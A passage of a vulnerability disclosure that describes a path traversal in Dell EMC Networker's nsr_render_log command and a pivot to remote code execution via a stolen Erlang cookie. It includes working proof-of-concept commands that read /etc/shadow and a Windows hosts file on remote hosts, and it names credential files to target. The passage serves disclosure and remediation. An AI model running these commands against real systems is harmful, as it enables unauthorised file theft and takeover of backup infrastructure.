121415:nsrpolicy: Command from file: database dir   : c:/Windows/system32/config/systemprofile/AppData/Roaming/RabbitMQ/db/rabbit@NETWORKER-WIN-mnesia
```

More details about getting RCE via the Erlang distribution port can be found in [[1](#ref1)], [[2](#ref2)], and [[3](#ref3)].

#### A note on exploitability

In order to pivot from arbitrary file read to remote command execution, one needs
to be able to reach the Erlang distribution port. This port is randomly chosen
every time the Erlang runtime starts up, but can be requested from the Erlang Port
Mapper Daemon (epmd) exposed on port TCP/4369. We noted that on recent versions of Networker, the port was always set to 25672, which is in line with recent versions of RabbitMQ.

If a firewall is in place and that this firewall follows the rules advised by the
Dell EMC Networker Security Configuration Guide, then gaining remote command execution
through Erlang distribution won't be possible. This would still be exploitable from the host
itself as a local privilege escalation primitive though.

Of course the arbitrary file read leaves plenty of other ways to compromise the target, such as dumping host users password hashes from /etc/shadow or reading the EMC Networker administrator password hash from /nsr/authc/data/authcdb.h2.db.

---

### Arbitrary File Read with nsr_render_log

The 'nsr\_render\_log' command exposed by Dell EMC Networker nsrexecd service is
affected by a path traversal vulnerability. By abusing this flaw and existing
weaknesses in the oldauth/nsrauth authentication mechanisms, an unauthenticated
attacker could read sensitive files from any host exposing the nsrexecd service
(Dell EMC Networker Server, Dell EMC Networker Client, Dell EMC Networker Storage Node).

On Dell EMC Networker Server, this path traversal can be turned into remote command
execution by taking advantage of Erlang runtime's presence. Specifically, an attacker
can obtain the Erlang cookie value from a file stored on the remote system and use it
to establish an authenticated session to the remote Erlang daemon, therefore gaining
the ability to execute arbitrary commands on the remote system with elevated privileges.

### Impact

An unauthenticated attacker can gain remote command execution with administrative
privileges (root on Linux, SYSTEM on Windows) on hosts where Dell EMC Networker Server
is installed. 

An unauthenticated attacker can gain remote access to any file on hosts where either
Dell EMC Networker Server, Dell EMC Networker Client, or Dell EMC Networker Storage Node
is installed.

Note that by compromising a Networker server, an attacker would also gain access to information
stored on the filesystems of all Dell EMC Networker clients and storage nodes 
registered on that server.

### Affected Products

The following Dell EMC Networker products are affected:

- Dell EMC Networker Server version >= 9.1.0.2 for Linux (remote arbitrary file read and RCE)
- Dell EMC Networker Server version >= 9.1.0.2 for Windows (remote arbitrary file read and RCE)
- Dell EMC Networker Storage Node version >= 9.1.0.2 for Linux (remote arbitrary file read)
- Dell EMC Networker Storage Node version >= 9.1.0.2 for Windows (remote arbitrary file read)
- Dell EMC Networker Storage Node >= 9.1.0.2 for HP-UX (remote arbitrary file read) *
- Dell EMC Networker Storage Node >= 9.1.0.2 for Solaris (remote arbitrary file read) *
- Dell EMC Networker Client version >= 9.1.0.2 for Linux (remote arbitrary file read)
- Dell EMC Networker Client version >= 9.1.0.2 for Windows (remote arbitrary file read)
- Dell EMC Networker Client version >= 9.1.0.2 for Mac OSX (remote arbitrary file read) *
- Dell EMC Networker Client version >= 9.1.0.2 for Solaris (remote arbitrary file read) *
- Dell EMC Networker Client version >= 9.1.0.2 for AIX (remote arbitrary file read) *
- Dell EMC Networker Client version >= 9.1.0.2 for HP-UX (remote arbitrary file read) *

Please note that we could not test against versions prior to 9.1.0.2 for lack of availability. The latest version we tested against is version **19.4.0.0.Build.25**, which is the latest stable version per Dell EMC.

Items marked with a star are unconfirmed, but we are strongly confident that they're also affected given that they share the same code base with the Linux version. Any product from Dell EMC that expose nsrexecd is most likely affected too.

## Description

From the nsrexec manual page:

> The  nsrexec  command  is run only by other NetWorker commands. It is used to remotely execute commands on NetWorker clients running nsrexecd, and also to monitor the progress of those commands.

This description is misleading given that nsrexecd runs on every EMC Networker component (server, client, and storage node). We also would like to point out that by "commands", they mean "networker commands" and not "arbitrary commands". Networker commands are a limited subset of Networker binaries such as *savefs* or *savegrp*

One command that caught our eye is **nsr\_render\_log**. This command reads messages from the NetWorker log file provided as parameter, filters and renders them according to the command line options, and sends the output to stdout.

In the example below, we run nsr\_render\_log on Networker host 192.168.121.137 to obtain tabulated logs from the daemon log file. It is nsr\_render\_log job of rendering timestamps, severity level, PID, etc from the raw file content.

```
[root@networker-client1 vagrant]# export RCMD='nsr_render_log /nsr/logs/daemon.raw'
[root@networker-client1 vagrant]# nsrexec -c 192.168.121.137
101040 30/11/20 10:26:45  1 3 0 1781430080 3928 0 networker-server nsrexecd RAP notice Generated new 'NW instance ID': 982b058f-00000004-a6d07aa0-5fc4c8e5-00015452-53cbca00 and keys for nsrauth RPC authentication. 
0 30/11/20 10:26:45  1 5 0 1781430080 3928 0 networker-server nsrexecd NSR notice @(#) Product:      NetWorker 
0 30/11/20 10:26:45  1 5 0 1781430080 3928 0 networker-server nsrexecd NSR notice @(#) Release:      9.1.0.2.Build.43 
--snip--
```

However, given that nsr\_render\_log does not validate the received path and that it runs
with root privileges, we can force it to read any file:

```
[root@networker-client1 vagrant]# export RCMD='nsr_render_log /etc/shadow'
[root@networker-client1 vagrant]# nsrexec -c 192.168.121.137
5 9 1 1 0 0 unknown unknown LOG unrendered root:$1$m.REDACTEDccI.::0:99999:7:::
5 9 1 1 0 0 unknown unknown LOG unrendered bin:*:18353:0:99999:7:::
5 9 1 1 0 0 unknown unknown LOG unrendered daemon:*:18353:0:99999:7:::
5 9 1 1 0 0 unknown unknown LOG unrendered adm:*:18353:0:99999:7:::
5 9 1 1 0 0 unknown unknown LOG unrendered lp:*:18353:0:99999:7:::
--snip--
```

Windows hosts are also affected, here we demonstrate it by reading the remote system hosts file:

```
[root@networker-client1 vagrant]# export RCMD='nsr_render_log "C:\\Windows\\System32\\drivers\\etc\\hosts"'
[root@networker-client1 vagrant]# nsrexec -c 192.168.121.182
5  1 1 0 0 unknown unknown LOG unrendered # Copyright (c) 1993-2009 Microsoft Corp.
5  1 1 0 0 unknown unknown LOG unrendered #
5  1 1 0 0 unknown unknown LOG unrendered # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
Unable to render the following message: # Copyright (c) 1993-2009 Microsoft Corp.
Unable to render the following message: #
Unable to render the following message: # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
--snip--
```

---

### Recommendations to Networker Administrators

Fix your Dell EMC Networker by following the Dell EMC Networker Security Guidelines to the letter. Do not allow oldauth, limit exposure of nsrexecd with strong firewall rules, and IP whitelisting in Networker config, provision NSRLA entries *prior* to running nodes.

### Recommendations to Dell

We recommend Dell EMC to protect the nsrexecd service against path traversal by fixing the
nsr_render_log binary so that it verifies that the file being read is in fact a Dell
EMC Networker log file and that this file is part of a Dell EMC Networker install
subdirectory.

We recommend Dell EMC to configure the Erlang runtime not to expose the Erlang
distribution service on all interfaces. Our understanding is that Erlang is present
due to usage of RabbitMQ message broker for message based communication between
the EMC Networker server and NMC Server. The only port that needs to be exposed for
that communication channel to be established is port TCP/5672 for plaintext AMQP
or TCP/5671 for SSL/TLS AMQP. The Erlang Port Mapper Daemon service exposed on 
TCP/4369 and the Erlang distribution service bound to a random port are not required
for that purpose and can be closed by configuration or firewall rule.

### References

- [0] <span id="ref0"/>**Dell Technologies** - *EMC NetWorker Security Configuration Guide* - [https://www.delltechnologies.com/en-us/collaterals/unauth/technical-guides-support-information/products/data-protection/docu91948.pdf](https://www.delltechnologies.com/en-us/collaterals/unauth/technical-guides-support-information/products/data-protection/docu91948.pdf)
- [1] <span id="ref1" />**Insinuator** - *Erlang distribution RCE and a cookie bruteforcer* [https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)
- [2] <span id="ref2" />**Rapid7** - *Erlang Port Mapper Daemon Cookie RCE* - [https://www.rapid7.com/db/modules/exploit/multi/misc/erlang_cookie_rce/](https://www.rapid7.com/db/modules/exploit/multi/misc/erlang_cookie_rce/)
- [3] <span id="ref3" />**gteissier** - *erl-matter* - [https://github.com/gteissier/erl-matter](https://github.com/gteissier/erl-matter)


### PoC||GTFO

All proof-of-concepts are available on [Github](https://github.com/qkaiser/networker-pocs).
